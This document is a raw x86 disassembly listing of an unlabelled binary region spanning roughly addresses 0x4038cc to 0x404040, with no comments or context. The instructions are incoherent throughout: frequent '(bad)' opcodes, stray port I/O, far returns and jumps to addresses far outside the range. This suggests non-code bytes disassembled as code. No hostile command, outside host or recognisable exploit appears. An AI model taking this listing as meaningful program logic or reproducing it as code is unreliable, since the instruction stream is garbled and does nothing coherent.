  4038cc:	add    eax,0xed0b2e94
  4038d1:	retf   
  4038d2:	int3   
  4038d3:	fiadd  WORD PTR [ecx-0x33]
  4038d6:	push   eax
  4038d7:	test   BYTE PTR [eax+0x57],bh
  4038da:	mov    edi,0x993f398
  4038df:	mov    ch,0x74
  4038e1:	lds    esp,FWORD PTR ds:0x123a5ecf
  4038e7:	test   al,0x75
  4038e9:	pushf  
  4038ea:	xor    al,0xd4
  4038ec:	dec    edi
  4038ed:	sahf   
  4038ee:	test   BYTE PTR [ecx-0x24],cl
  4038f1:	and    al,0xf2
  4038f3:	(bad)  
  4038f4:	(bad)  
  4038f5:	pop    edx
  4038f6:	in     al,dx
  4038f7:	and    DWORD PTR [ebp+0x46b29e04],edx
  4038fd:	cmc    
  4038fe:	add    DWORD PTR [ebx+0x7aa1d674],esi
  403904:	repnz inc eax
  403906:	mov    cl,0x4e
  403908:	mov    bl,0x82
  40390a:	fld    DWORD PTR [eax-0x40fed042]
  403910:	xchg   BYTE PTR [edx],bl
  403912:	shr    DWORD PTR ds:0xedf58da9,1
  403918:	cmp    DWORD PTR [ebp-0x6],0x3
  40391c:	jg     0x4038a5
  40391e:	jne    0x403964
  403920:	push   ds
  403921:	xor    BYTE PTR [edi],0xc0
  403924:	imul   ebx,ebx,0xffffffea
  403927:	xchg   edi,eax
  403928:	jge    0x40396f
  40392a:	add    bl,BYTE PTR [ecx]
  40392c:	xchg   ebp,eax
  40392d:	mov    dl,bh
  40392f:	push   esi
  403930:	xor    DWORD PTR [ecx],esp
  403932:	or     ch,BYTE PTR [edx+ecx*2]
  403935:	push   0x671c055
  40393a:	mov    esp,0x77223651
  40393f:	sar    BYTE PTR [ecx],1
  403941:	xchg   ebx,eax
  403942:	jae    0x4039a9
  403944:	push   0xcdaa2370
  403949:	es data16 jp 0x403967
  40394d:	cmp    edi,DWORD PTR [ecx+esi*1+0x26e18184]
  403954:	push   ds
  403955:	nop
  403956:	pop    eax
  403957:	pop    edx
  403958:	fld    QWORD PTR [ebp+ecx*8-0x380abe09]
  40395f:	xchg   edi,eax
  403960:	xchg   edi,eax
  403961:	cmp    BYTE PTR [esi-0x2a],cl
  403964:	pop    ds
  403965:	xor    al,0x95
  403967:	stos   BYTE PTR es:[edi],al
  403968:	icebp  
  403969:	aam    0x4e
  40396b:	test   DWORD PTR [edi],ecx
  40396d:	mov    ds:0xb4a68f77,al
  403972:	ss aad 0x98
  403975:	push   0xffffffd7
  403977:	jecxz  0x40390c
  403979:	pop    es
  40397a:	ins    BYTE PTR es:[edi],dx
  40397b:	jmp    0x403995
  40397d:	(bad)  
  40397e:	in     eax,0x77
  403980:	adc    ebp,DWORD PTR [edi+0x335f6e5e]
  403986:	add    BYTE PTR [edi+ecx*4-0x52],bl
  40398a:	sti    
  40398b:	pop    ds
  40398c:	dec    edx
  40398d:	ror    BYTE PTR ds:0x466e00d,1
  403993:	push   ebp
  403994:	std    
  403995:	sbb    ch,ch
  403997:	adc    DWORD PTR [ebp+0xa],ebp
  40399a:	lock jae 0x40392c
  40399d:	cwde   
  40399e:	(bad)  [ebx+0x1e98c4a6]
  4039a4:	xor    al,BYTE PTR [esi-0x27]
  4039a7:	imul   edx,DWORD PTR [esi+0x216dd9be],0xb0868dde
  4039b1:	out    0x9,eax
  4039b3:	jno    0x403a2b
  4039b5:	mov    eax,0xad818600
  4039ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039bb:	daa    
  4039bc:	inc    esi
  4039bd:	or     ebp,DWORD PTR [edx]
  4039bf:	in     eax,0x98
  4039c1:	dec    edx
  4039c2:	cmovae eax,DWORD PTR [ecx-0x2d]
  4039c6:	add    DWORD PTR [ebp+edi*4+0x223f8150],esp
  4039cd:	push   ds
  4039ce:	mov    eax,ds:0xca13efd9
  4039d3:	arpl   WORD PTR [esi+0x65],ax
  4039d6:	ds lock nop
  4039d9:	add    bl,BYTE PTR [esi+esi*8+0x17c32c0a]
  4039e0:	pop    esp
  4039e1:	in     eax,0xf2
  4039e3:	sub    bl,BYTE PTR [edx-0x12]
  4039e6:	sbb    al,0xde
  4039e8:	jmp    0x4039ff
  4039ea:	sbb    dl,dl
  4039ec:	xor    BYTE PTR [ecx],dl
  4039ee:	pop    ebx
  4039ef:	push   ebp
  4039f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039f1:	fstp   QWORD PTR [ebp+0x524e4840]
  4039f7:	std    
  4039f8:	sub    ah,ah
  4039fa:	test   al,0xf1
  4039fc:	stos   BYTE PTR es:[edi],al
  4039fd:	(bad)  
  4039fe:	fimul  WORD PTR [eax]
  403a00:	icebp  
  403a01:	inc    ebp
  403a02:	stos   DWORD PTR es:[edi],eax
  403a03:	call   0x59ad9821
  403a08:	fwait
  403a09:	out    dx,eax
  403a0a:	ins    BYTE PTR es:[edi],dx
  403a0b:	xor    ecx,ebx
  403a0d:	clc    
  403a0e:	and    eax,0xc33148c2
  403a13:	add    al,0x3d
  403a15:	jae    0x4039c7
  403a17:	(bad)  
  403a18:	xchg   ecx,eax
  403a19:	jno    0x403a07
  403a1b:	sub    edi,esi
  403a1d:	clc    
  403a1e:	ins    BYTE PTR es:[edi],dx
  403a1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a20:	mov    ch,0xbd
  403a22:	enter  0xa6cf,0xe8
  403a26:	aaa    
  403a27:	call   0xe1e08bf8
  403a2c:	test   al,0x2
  403a2e:	add    DWORD PTR [ebp+0xd],esp
  403a31:	sbb    BYTE PTR [ecx-0x17],dh
  403a34:	(bad)  
  403a36:	ret    0xe29f
  403a39:	les    ecx,FWORD PTR [ecx-0x96b86e6]
  403a3f:	(bad)  
  403a40:	out    0x33,al
  403a42:	jo     0x403ac3
  403a44:	(bad)  
  403a45:	loope  0x403a80
  403a47:	(bad)  
  403a48:	aad    0xd4
  403a4a:	xchg   ebx,eax
  403a4b:	into   
  403a4c:	sub    eax,0xb8c12d67
  403a51:	or     dl,BYTE PTR [esi+0x56]
  403a54:	inc    edx
  403a55:	xor    eax,DWORD PTR [eax+0x3d04c699]
  403a5b:	fnsave [edx+0x40]
  403a5e:	jl     0x403aab
  403a60:	push   ss
  403a61:	cmp    eax,0x9a933364
  403a66:	loop   0x403a43
  403a68:	(bad)
  403a6b:	push   edi
  403a6c:	cwde   
  403a6d:	pop    es
  403a6e:	sub    eax,DWORD PTR [ebp-0x2215301]
  403a74:	dec    edx
  403a75:	cdq    
  403a76:	xchg   ecx,eax
  403a77:	mov    ebp,ds
  403a79:	fs pop ebp
  403a7b:	fidiv  WORD PTR [esi]
  403a7d:	scas   eax,DWORD PTR es:[edi]
  403a7e:	stc    
  403a7f:	lock push esi
  403a81:	gs pop esi
  403a83:	aad    0xa8
  403a85:	or     al,0x6d
  403a87:	add    ch,BYTE PTR [eax+ebp*1+0x5c]
  403a8b:	xchg   ecx,eax
  403a8c:	call   0x59e0:0x1ff882b5
  403a93:	inc    esi
  403a94:	mov    ecx,0xa0bd75e0
  403a99:	sub    al,0xe2
  403a9b:	xor    DWORD PTR [esi-0x46],edx
  403a9e:	push   es
  403a9f:	test   al,0xce
  403aa1:	mov    esp,0x1ceea917
  403aa6:	js     0x403ae0
  403aa8:	test   DWORD PTR [ebp-0x39d32cd3],edi
  403aae:	(bad)  [bp+si]
  403ab1:	jmp    0x403b20
  403ab3:	inc    esp
  403ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ab5:	mov    bh,0xb0
  403ab7:	aaa    
  403ab8:	push   ecx
  403ab9:	out    dx,eax
  403aba:	fsub   st(0),st
  403abc:	pop    edx
  403abd:	mov    DWORD PTR [ecx],ecx
  403abf:	repz dec esi
  403ac1:	in     eax,dx
  403ac2:	add    DWORD PTR [edi-0x7ed9a595],eax
  403ac8:	xor    DWORD PTR [ecx],ebx
  403aca:	loop   0x403b1b
  403acc:	clc    
  403acd:	mov    ebp,ds
  403acf:	int3   
  403ad0:	retf   
  403ad1:	jecxz  0x403ac9
  403ad3:	jb     0x403aec
  403ad5:	out    0x48,al
  403ad7:	(bad)  
  403ad8:	outs   dx,DWORD PTR ds:[esi]
  403ad9:	jecxz  0x403a9f
  403adb:	xor    BYTE PTR [ebp-0x550dd9e0],dl
  403ae1:	xchg   BYTE PTR [eax],dl
  403ae3:	out    0x2a,eax
  403ae5:	retf   0x5125
  403ae8:	(bad)  
  403aea:	push   ecx
  403aeb:	loope  0x403a77
  403aed:	sahf   
  403aee:	lods   eax,DWORD PTR ds:[esi]
  403aef:	sar    edi,0x54
  403af2:	adc    BYTE PTR [eax+ebx*4],dl
  403af5:	push   ebx
  403af6:	fsubr  DWORD PTR [edi+edx*4-0x32065bba]
  403afd:	dec    edx
  403afe:	sub    esi,eax
  403b00:	push   ebp
  403b01:	mov    al,ds:0x46c1d16c
  403b06:	out    dx,al
  403b07:	int    0x93
  403b09:	jae    0x403aca
  403b0b:	ja     0x403ade
  403b0d:	sbb    DWORD PTR fs:[ebp-0x7b24aba3],edx
  403b14:	loopne 0x403ae8
  403b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b17:	xchg   BYTE PTR [ecx+0x7a],al
  403b1a:	loopne 0x403af4
  403b1c:	test   BYTE PTR [edx+0x420b5b9f],ch
  403b22:	or     al,BYTE PTR [esi]
  403b24:	mov    edx,0x74d4d543
  403b29:	adc    BYTE PTR [eax+ebp*2+0x32],al
  403b2d:	outs   dx,BYTE PTR ds:[esi]
  403b2e:	and    al,0xef
  403b30:	xor    esp,DWORD PTR [esi-0x6a98ae7d]
  403b36:	std    
  403b37:	jl     0x403b2d
  403b39:	out    dx,eax
  403b3a:	fld    DWORD PTR [ecx+0x34]
  403b3d:	sbb    DWORD PTR [eax+0x45],ecx
  403b40:	dec    edx
  403b41:	popa   
  403b42:	pop    ebx
  403b43:	sbb    al,BYTE PTR [edx]
  403b45:	ret    
  403b46:	cs out dx,al
  403b48:	ret    0x3c04
  403b4b:	scas   eax,DWORD PTR es:[edi]
  403b4c:	retf   
  403b4d:	pop    ecx
  403b4e:	out    0x5f,al
  403b50:	fbld   TBYTE PTR [ebx-0x6]
  403b53:	push   cs
  403b54:	adc    eax,0x6b6fe0a4
  403b59:	repnz das 
  403b5b:	mov    ebx,0xe55a1833
  403b60:	ret    0x64fe
  403b63:	(bad)
  403b67:	mov    ebx,0x5dd2efaf
  403b6c:	inc    ecx
  403b6d:	fldenv [ebx]
  403b6f:	aad    0xfe
  403b71:	popa   
  403b72:	push   eax
  403b73:	mov    esp,0x46301673
  403b78:	jecxz  0x403b15
  403b7a:	pop    ecx
  403b7b:	xchg   esp,eax
  403b7c:	fdiv   QWORD PTR [ebx]
  403b7e:	pop    esp
  403b7f:	fisttp DWORD PTR [edx+0x25c25706]
  403b85:	pushf  
  403b86:	sub    al,0xce
  403b88:	int    0x97
  403b8a:	clc    
  403b8b:	les    ebx,FWORD PTR [ebx]
  403b8d:	shl    DWORD PTR [ebp-0x25700e4c],0x8b
  403b94:	stos   BYTE PTR es:[edi],al
  403b95:	(bad)  
  403b96:	loop   0x403b6b
  403b98:	mov    edi,ebx
  403b9a:	stc    
  403b9b:	pop    ebx
  403b9c:	jecxz  0x403bc7
  403b9e:	add    eax,0x7c3f0e77
  403ba3:	retf   
  403ba4:	popf   
  403ba5:	scas   eax,DWORD PTR es:[edi]
  403ba6:	(bad)  
  403ba7:	jnp    0x403bda
  403ba9:	lods   al,BYTE PTR ds:[esi]
  403baa:	aas    
  403bab:	or     ecx,edx
  403bad:	(bad)  
  403bae:	popf   
  403baf:	inc    ecx
  403bb0:	xchg   esp,eax
  403bb1:	jb     0x403b7a
  403bb3:	inc    ecx
  403bb4:	fdivr  DWORD PTR [eax]
  403bb6:	mov    DWORD PTR [eax+ecx*8],edi
  403bb9:	addr16 dec edi
  403bbb:	clc    
  403bbc:	push   eax
  403bbd:	or     eax,0xdbd1a232
  403bc2:	inc    esp
  403bc3:	xchg   esp,eax
  403bc4:	iret   
  403bc5:	or     BYTE PTR [edi],cl
  403bc7:	loope  0x403c11
  403bc9:	ret    0xf9da
  403bcc:	cs push 0xffffff8c
  403bcf:	adc    al,BYTE PTR [ecx]
  403bd1:	(bad)  
  403bd2:	mov    cl,0x87
  403bd4:	in     al,dx
  403bd5:	scas   eax,DWORD PTR es:[edi]
  403bd6:	or     BYTE PTR [ecx],dh
  403bd8:	(bad)  [edx-0x58f7434a]
  403bde:	xor    dl,dh
  403be0:	sbb    esp,edi
  403be2:	lods   al,BYTE PTR ds:[esi]
  403be3:	push   cs
  403be4:	(bad)  
  403be5:	fidiv  DWORD PTR [ebp+ebx*1+0x35]
  403be9:	test   DWORD PTR [eax+edx*2],ecx
  403bec:	arpl   WORD PTR ds:0xe8ee9f1a,sp
  403bf2:	cmp    DWORD PTR [edx+0x357bb0e],0x4a
  403bf9:	jecxz  0x403b8f
  403bfb:	jg     0x403c46
  403bfd:	enter  0x7c30,0x92
  403c01:	sbb    eax,0xb3cf4fe4
  403c06:	mov    ds:0x4c31427b,eax
  403c0b:	jle    0x403c43
  403c0d:	ds out dx,eax
  403c0f:	add    cl,BYTE PTR [ebx]
  403c11:	lods   al,BYTE PTR ds:[esi]
  403c12:	sub    bl,bl
  403c14:	fimul  WORD PTR [eax]
  403c16:	popf   
  403c17:	dec    edi
  403c18:	mov    edx,0x42c2ea13
  403c1d:	outs   dx,DWORD PTR ds:[esi]
  403c1e:	int    0x4c
  403c20:	dec    ebp
  403c21:	test   BYTE PTR [ecx-0x61a44f3c],bh
  403c27:	pop    esp
  403c28:	jl     0x403be6
  403c2a:	jmp    0x4699513b
  403c2f:	jecxz  0x403bf4
  403c31:	in     al,dx
  403c32:	xchg   esi,eax
  403c33:	inc    BYTE PTR [esi-0x78a96a84]
  403c39:	adc    DWORD PTR [edi+ebp*1+0x5dd23e9],edx
  403c40:	jno    0x403c94
  403c42:	mov    DWORD PTR [ebx*2-0x1336354a],edx
  403c49:	(bad)  
  403c4a:	xor    al,0x82
  403c4c:	nop
  403c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c4e:	imul   esp,DWORD PTR ds:0xd4d929ff,0x9808a779
  403c58:	aaa    
  403c59:	or     DWORD PTR [ebx-0x68e9e9c2],ebx
  403c5f:	sub    DWORD PTR [edx+0x3a41ee55],esi
  403c65:	jp     0x403c95
  403c67:	lods   al,BYTE PTR ds:[esi]
  403c68:	shl    cl,1
  403c6a:	ss and al,0xd7
  403c6d:	shl    DWORD PTR [ebp+edi*4-0x6635b5f3],1
  403c74:	ins    BYTE PTR es:[edi],dx
  403c75:	ficom  DWORD PTR [edi-0x5d]
  403c78:	cdq    
  403c79:	xchg   ecx,eax
  403c7a:	mov    BYTE PTR [ebx+0xf],bl
  403c7d:	adc    ebp,DWORD PTR [esi+0x45]
  403c80:	fldenv [ebx+0x54a57a0]
  403c86:	inc    eax
  403c87:	or     edi,DWORD PTR [ebx-0x32]
  403c8a:	mov    DWORD PTR [esi+edi*2],ebx
  403c8d:	xchg   DWORD PTR [edi],edi
  403c8f:	jmp    0x3f974d57
  403c94:	sub    ch,BYTE PTR [ebp-0x3d639b23]
  403c9a:	lods   eax,DWORD PTR ds:[esi]
  403c9b:	sbb    DWORD PTR [ecx+0x604c066c],esp
  403ca1:	in     al,0xe1
  403ca3:	pop    ss
  403ca4:	retf   
  403ca5:	(bad)  
  403ca6:	shl    DWORD PTR [ebp+0x4c],0x12
  403caa:	add    BYTE PTR ds:0x189bf2e,0x1b
  403cb1:	mov    al,BYTE PTR [ecx]
  403cb3:	xchg   edx,eax
  403cb4:	sbb    bl,BYTE PTR [edi+0x1adb2c6c]
  403cba:	jo     0x403c97
  403cbc:	sbb    eax,0x7bd38a56
  403cc1:	aam    0x32
  403cc3:	jnp    0x403cc1
  403cc5:	mov    BYTE PTR [eax],dh
  403cc7:	bound  eax,QWORD PTR [ebx]
  403cc9:	pushf  
  403cca:	push   esp
  403ccb:	xchg   esp,eax
  403ccc:	fild   QWORD PTR [esi+0x41b0ab99]
  403cd2:	dec    esp
  403cd3:	or     DWORD PTR [esi],ebx
  403cd5:	pushf  
  403cd6:	cmp    al,0x51
  403cd8:	outs   dx,DWORD PTR ds:[esi]
  403cd9:	add    edi,eax
  403cdb:	push   ss
  403cdc:	sbb    eax,0xd8b90554
  403ce1:	lahf   
  403ce2:	dec    ebx
  403ce3:	xchg   edx,eax
  403ce4:	iret   
  403ce5:	iret   
  403ce6:	retf   0x895a
  403ce9:	pushf  
  403cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ceb:	add    al,0x7f
  403ced:	lock dec ebx
  403cef:	mov    esi,0x643fa6b8
  403cf4:	inc    esi
  403cf5:	int    0xd3
  403cf7:	sti    
  403cf8:	fmul   QWORD PTR [edx]
  403cfa:	arpl   WORD PTR [eax+esi*1-0x4],si
  403cfe:	hlt    
  403cff:	bound  eax,QWORD PTR [edi-0xb]
  403d02:	push   edx
  403d03:	daa    
  403d04:	dec    esp
  403d05:	jle    0x403d56
  403d07:	div    BYTE PTR [ecx-0x75]
  403d0a:	push   edx
  403d0b:	mov    WORD PTR [ebx],es
  403d0d:	dec    esi
  403d0e:	int    0x47
  403d10:	sar    bh,0xe9
  403d13:	cmp    dh,bl
  403d15:	jp     0x403d06
  403d17:	add    dh,ch
  403d19:	mov    ch,0x9c
  403d1b:	mov    esp,0x94a1748e
  403d20:	mov    ah,0xf3
  403d22:	xor    eax,0xfb336c8c
  403d27:	xor    eax,0x21240013
  403d2c:	adc    bl,ch
  403d2e:	gs jbe 0x403cf8
  403d31:	cmp    ebx,DWORD PTR [esi+0x6704ced6]
  403d37:	(bad)  
  403d38:	adc    bh,BYTE PTR [ebx+0x2fbf5f95]
  403d3e:	dec    ecx
  403d3f:	xor    DWORD PTR [ecx-0x4e87ac67],ecx
  403d45:	fist   DWORD PTR [esi+0x38]
  403d48:	dec    edx
  403d49:	mov    bh,0x5b
  403d4b:	pop    edi
  403d4c:	sub    esp,ecx
  403d4e:	fwait
  403d4f:	out    dx,al
  403d50:	push   0x74
  403d52:	xor    al,0xfe
  403d54:	push   esi
  403d55:	xchg   DWORD PTR [ebx],edx
  403d57:	mov    ch,0x9
  403d59:	dec    esp
  403d5a:	xchg   ebx,eax
  403d5b:	cwde   
  403d5c:	hlt    
  403d5d:	scas   al,BYTE PTR es:[edi]
  403d5e:	call   DWORD PTR [edx+0x2b]
  403d61:	ret    
  403d62:	icebp  
  403d63:	mov    ebx,0x743b543b
  403d68:	xor    eax,esi
  403d6a:	in     eax,dx
  403d6b:	jg     0x403d73
  403d6d:	in     eax,0x3b
  403d6f:	lds    edx,FWORD PTR [edx]
  403d71:	push   ds
  403d72:	dec    ecx
  403d73:	jecxz  0x403d41
  403d75:	int3   
  403d76:	xor    edi,edx
  403d78:	add    al,BYTE PTR [edx-0x61]
  403d7b:	add    BYTE PTR [eax],0xc9
  403d7e:	push   0x633e5664
  403d83:	(bad)  
  403d84:	pusha  
  403d85:	ror    esi,1
  403d87:	jne    0x403d18
  403d89:	lods   al,BYTE PTR ds:[esi]
  403d8a:	mov    ebx,0x591d140d
  403d8f:	aad    0x1e
  403d91:	mov    ds:0xf45428c0,al
  403d96:	cdq    
  403d97:	xlat   BYTE PTR ds:[ebx]
  403d98:	loop   0x403d46
  403d9a:	jb     0x403d97
  403d9c:	shl    esp,0x42
  403d9f:	iret   
  403da0:	mov    ds:0xaf40ebc8,al
  403da5:	aaa    
  403da6:	sub    DWORD PTR [edx],edx
  403da8:	and    esi,DWORD PTR [edx]
  403daa:	jecxz  0x403d84
  403dac:	fsubp  st(6),st
  403dae:	cmp    al,0x5
  403db0:	jns    0x403d5f
  403db2:	pop    ebx
  403db3:	and    DWORD PTR [eax+0x41284d6f],edi
  403db9:	pop    ebx
  403dba:	pop    esi
  403dbb:	js     0x403d92
  403dbd:	dec    esi
  403dbe:	sub    BYTE PTR [ebp+0x21],bh
  403dc1:	fmul   QWORD PTR [esp+ebp*4-0x1cae4a0]
  403dc8:	add    eax,0x46087456
  403dcd:	sbb    al,0x40
  403dcf:	jl     0x403e40
  403dd1:	call   DWORD PTR [eax-0x239d9252]
  403dd7:	call   DWORD PTR [edx]
  403dd9:	dec    ebp
  403dda:	pop    ebp
  403ddb:	inc    esp
  403ddc:	ss push 0x43
  403ddf:	inc    ecx
  403de0:	and    ah,BYTE PTR [esi]
  403de2:	mov    esi,0x82e35b27
  403de7:	push   ebp
  403de8:	ss dec ebx
  403dea:	inc    esi
  403deb:	mov    ch,BYTE PTR [ecx]
  403ded:	call   0xd29885d
  403df2:	sbb    dh,dl
  403df4:	loop   0x403e41
  403df6:	pop    ds
  403df7:	xor    dl,BYTE PTR [edi+0x3d2e2af3]
  403dfd:	pop    ss
  403dfe:	lods   al,BYTE PTR ds:[esi]
  403dff:	jl     0x403da0
  403e01:	xchg   BYTE PTR [edx+edx*8],bl
  403e04:	mov    dl,0xe1
  403e06:	sub    DWORD PTR ds:0xe3c1241a,ebx
  403e0c:	inc    edi
  403e0d:	jmp    0x403e2c
  403e0f:	enter  0x21fe,0x86
  403e13:	js     0x403e6d
  403e15:	sub    bh,BYTE PTR [ebx-0x3e51b598]
  403e1b:	sub    BYTE PTR [ecx-0x532509d6],dh
  403e21:	fs inc eax
  403e23:	bound  ebp,QWORD PTR [ebp+ebp*4+0x47800491]
  403e2a:	rcl    DWORD PTR [edx-0x474460b],0xd3
  403e31:	xchg   ebx,eax
  403e32:	xchg   BYTE PTR [eax+0x258a0296],cl
  403e38:	loope  0x403e8a
  403e3a:	imul   edi,DWORD PTR [edx+0x5067a8c],0xaab011a9
  403e44:	cmp    BYTE PTR [ecx-0x7fa772a1],0x2d
  403e4b:	or     ebp,esi
  403e4d:	cmp    ebp,DWORD PTR [edi+0x7333ec4]
  403e53:	cs sub eax,0xc425c804
  403e59:	mov    al,0x61
  403e5b:	add    al,0x7d
  403e5d:	pop    edx
  403e5e:	push   edi
  403e5f:	mov    esi,0xc38030dd
  403e64:	mov    ebx,0x27136fd
  403e69:	or     eax,0xefcb8a44
  403e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e6f:	cmp    bh,bh
  403e71:	call   DWORD PTR [ebx+0x307cd63d]
  403e77:	pop    ss
  403e78:	sub    DWORD PTR [esp+eax*4-0x4b],0xc254188
  403e80:	xchg   ebp,eax
  403e81:	and    eax,0xe73b2ff1
  403e86:	cmp    BYTE PTR [ebx+0x5],0xa5
  403e8a:	sbb    esi,DWORD PTR [eax+0x7c]
  403e8d:	in     al,0xd8
  403e8f:	xor    BYTE PTR [ecx],dl
  403e91:	lea    eax,[edx+eiz*1-0x602366f5]
  403e98:	in     eax,dx
  403e99:	in     eax,0xde
  403e9b:	dec    ebx
  403e9c:	shl    BYTE PTR [esi],0x7f
  403e9f:	add    bh,dh
  403ea1:	test   al,dh
  403ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea4:	gs push ecx
  403ea6:	pop    eax
  403ea7:	add    eax,0xe2be6dcd
  403eac:	push   eax
  403ead:	xchg   esp,eax
  403eae:	mov    dl,0x62
  403eb0:	imul   eax,DWORD PTR [ebx-0x35],0x6349e8be
  403eb7:	mov    eax,ds:0x7f1cd462
  403ebc:	test   al,0xec
  403ebe:	mov    edx,DWORD PTR [edx-0x66]
  403ec1:	mov    ah,0xed
  403ec3:	nop
  403ec4:	daa    
  403ec5:	push   ss
  403ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ec7:	ja     0x403eff
  403ec9:	std    
  403eca:	xchg   ecx,eax
  403ecb:	leave  
  403ecc:	and    bl,BYTE PTR [esi-0x4f0fcf88]
  403ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed3:	fadd   st(6),st
  403ed5:	iret   
  403ed6:	shl    DWORD PTR [ecx],1
  403ed8:	mov    bl,0x4d
  403eda:	cmc    
  403edb:	sbb    DWORD PTR [ebp+0x1f],edx
  403ede:	mov    ds:0x6616179b,al
  403ee3:	fst    QWORD PTR [esi+0x6662cd0d]
  403ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eea:	outs   dx,DWORD PTR ds:[esi]
  403eeb:	cli    
  403eec:	aaa    
  403eed:	or     eax,0xeae6a87d
  403ef2:	push   es
  403ef3:	stos   DWORD PTR es:[edi],eax
  403ef4:	fbld   TBYTE PTR [esi]
  403ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ef7:	lahf   
  403ef8:	sub    esp,DWORD PTR ds:0xf573fb17
  403efe:	scas   eax,DWORD PTR es:[edi]
  403eff:	shl    BYTE PTR [edi+esi*2+0xd],cl
  403f03:	mov    WORD PTR [esi],ds
  403f05:	das    
  403f06:	jl     0x403f3d
  403f08:	mov    ds:0xd0a15485,eax
  403f0d:	xor    ah,bl
  403f0f:	push   esi
  403f10:	dec    ebp
  403f11:	pop    eax
  403f12:	fistp  DWORD PTR [ebp+eax*4-0x61bec1a2]
  403f19:	sub    BYTE PTR [ebx-0x22280f42],0x3c
  403f20:	sub    eax,esp
  403f22:	cwde   
  403f23:	(bad)  
  403f24:	std    
  403f25:	mov    ecx,ebx
  403f27:	push   cs
  403f28:	xchg   ebp,eax
  403f29:	push   edi
  403f2a:	pushf  
  403f2b:	ss inc ecx
  403f2d:	add    al,0xe7
  403f2f:	stos   BYTE PTR es:[edi],al
  403f30:	push   ebp
  403f31:	shl    esi,0x69
  403f34:	mov    ah,0xda
  403f36:	push   ss
  403f37:	test   BYTE PTR [eax],0x55
  403f3a:	ins    BYTE PTR es:[edi],dx
  403f3b:	int3   
  403f3c:	fxch   st(5)
  403f3e:	pop    ebp
  403f3f:	pushf  
  403f40:	shr    DWORD PTR [edx+ebx*4-0x4624164c],1
  403f47:	mov    eax,0xf9d9c3ba
  403f4c:	adc    esi,DWORD PTR [esi+esi*2]
  403f4f:	sub    BYTE PTR [edi-0x2a],0xff
  403f53:	jecxz  0x403f2f
  403f55:	adc    bh,BYTE PTR [edx-0x3f]
  403f58:	in     eax,0x32
  403f5a:	out    dx,eax
  403f5b:	sbb    al,0x2a
  403f5d:	loopne 0x403fb2
  403f5f:	dec    ebp
  403f60:	cld    
  403f61:	(bad)  
  403f62:	cmp    eax,DWORD PTR [esi-0x62]
  403f65:	iret   
  403f66:	or     al,0x9f
  403f68:	test   al,0x4b
  403f6a:	sub    eax,0x484f30c7
  403f6f:	scas   eax,DWORD PTR es:[edi]
  403f70:	test   BYTE PTR [ecx],al
  403f72:	xchg   esp,eax
  403f73:	xor    al,0xb8
  403f75:	not    bl
  403f77:	es sbb eax,eax
  403f7a:	sbb    DWORD PTR ss:[ecx],ebx
  403f7d:	out    0xf7,al
  403f7f:	add    al,0x20
  403f81:	or     al,0x1b
  403f83:	jle    0x403f41
  403f85:	xchg   BYTE PTR [ebx],bh
  403f87:	adc    al,0xb2
  403f89:	mov    ah,BYTE PTR [edx+0x1c]
  403f8c:	push   0xfffffff5
  403f8e:	add    DWORD PTR [edx],eax
  403f90:	jne    0x403f8a
  403f92:	jnp    0x403fa9
  403f94:	mov    gs,WORD PTR [ebx-0x5827a6e0]
  403f9a:	xchg   DWORD PTR [ecx],edx
  403f9c:	(bad)  
  403f9d:	adc    ebp,DWORD PTR [esi-0x3f3a76e7]
  403fa3:	pop    ds
  403fa4:	xor    eax,0x6a02360
  403fa9:	mov    edi,0xf6c934be
  403fae:	mov    edx,0x55c7eca3
  403fb3:	jl     0x403f42
  403fb5:	loop   0x403f50
  403fb7:	sar    DWORD PTR [ebx+eax*1],0xf0
  403fbb:	retf   
  403fbc:	fisub  WORD PTR [ebp+0x2b]
  403fbf:	mov    al,0xb6
  403fc1:	int3   
  403fc2:	mov    dh,0x65
  403fc4:	lahf   
  403fc5:	mov    edx,0x6ee4ccb
  403fca:	push   cs
  403fcb:	pop    edi
  403fcc:	mov    al,0x52
  403fce:	ficomp WORD PTR [ebp+0x20c9bf76]
  403fd4:	push   ecx
  403fd5:	xchg   edi,eax
  403fd6:	mov    ds:0x226e61d8,eax
  403fdb:	add    al,0x52
  403fdd:	and    DWORD PTR [ecx+0x61],ebx
  403fe0:	and    edi,DWORD PTR [edx+0x5c]
  403fe3:	out    0xa8,al
  403fe5:	push   ebp
  403fe6:	push   ss
  403fe7:	adc    DWORD PTR [ecx],ebp
  403fe9:	cmp    al,bh
  403feb:	add    ecx,DWORD PTR [edx+eax*1-0x29364a9a]
  403ff2:	adc    eax,0xcc7559bd
  403ff7:	dec    ebp
  403ff8:	(bad)  
  403ff9:	push   0x64c46193
  403ffe:	scas   al,BYTE PTR es:[edi]
  403fff:	mov    BYTE PTR [esi],ch
  404001:	push   ds
  404002:	inc    esp
  404003:	add    eax,0x7b534a77
  404008:	or     DWORD PTR [esi],ebp
  40400a:	ret    
  40400b:	inc    ebx
  40400c:	mov    ebx,0xd717a466
  404011:	shl    DWORD PTR [edx+eiz*2+0x3f89e392],0x85
  404019:	inc    BYTE PTR [edi]
  40401b:	nop
  40401c:	cmp    eax,0xd3adbe4d
  404021:	xlat   BYTE PTR ds:[ebx]
  404022:	cmp    BYTE PTR [ebx-0x5e],bl
  404025:	(bad)  
  404027:	jmp    0xf7e7a5eb
  40402c:	push   ss
  40402d:	hlt    
  40402e:	add    esi,DWORD PTR [ebx+0x65]
  404031:	clc    
  404032:	outs   dx,BYTE PTR ds:[esi]
  404033:	mov    edi,0xdcbc6700
  404038:	lods   al,BYTE PTR ds:[esi]
  404039:	jno    0x4040ba
  40403b:	push   ebp
  40403c:	lahf   
  40403d:	cmp    BYTE PTR [ebx+0x1e],dh
  404040:	xor    BYTE PTR [ecx],dh
